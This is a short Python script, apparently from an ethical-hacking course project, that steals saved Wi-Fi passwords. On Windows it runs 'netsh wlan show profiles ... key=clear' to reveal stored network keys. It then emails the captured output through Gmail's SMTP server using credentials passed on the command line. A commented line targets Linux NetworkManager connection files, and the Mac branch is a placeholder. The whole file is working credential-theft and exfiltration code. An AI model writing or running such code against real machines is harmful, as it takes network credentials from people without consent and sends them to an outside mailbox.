import subprocess, smtplib , re , optparse, time

result = ''
wireless_network = ''

#funciton to send info to email
def send_email(email, password, message):
    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email,email , message)
    email_server.quit()

#function used to use arguments on the command line 
def steal_pass_arguments():
    parse = optparse.OptionParser()
    parse.add_option('-e', '--email', dest='email',help='used to specify email address')
    parse.add_option('-p', '--password',dest='password' ,help='used to specify password')
    parse.add_option('-o',dest='command', help=' choose diffrent commands for diffrent Os"s')
    (option, arguments) = parse.parse_args()
    global result, wireless_network
    #you can specify what os you want to attack i made 3 common ones,
    #  you can change the commands to make the attacks more flexible
    if option.command: 
        if option.command =='windows':
            #windows systems
            command = 'netsh wlan show profiles'
            preview = subprocess.check_output(command, shell=True)
            print(preview)
            #timeout allows you to have some time to choose what ssid 
            # you want to attack before email is sent
            time.sleep(5.0)

            wireless_network = input('[+] please choose a wireless network: ')
            final_command = 'netsh wlan show profiles {0} key=clear'.format(wireless_network)
            result = subprocess.check_output(final_command, shell=True)
            
       
            return (option, arguments) 

        elif option.command == 'linux':
            #linux based systems
            # command = 'cat /etc/NetworkManager/system-connections/*'
            command = 'cat /root/Documents/python-for-ethical-hacking/malware/malware.py'

            result  = subprocess.check_output(command, shell=True)
            print(result)
            return (option, arguments) 
        elif option.command == 'mac':
            #mac based system
            command = 'cat /Users/hamu/test-file' #placeholder command to see if the mac command works
            result = subprocess.check_output(command, shell=True)
            print(result)
            return (option, arguments) 
        
    else:
        parse.error('[-] error no arguments were choosen')

(option, arguments) = steal_pass_arguments()
send_email(option.email, option.password,result )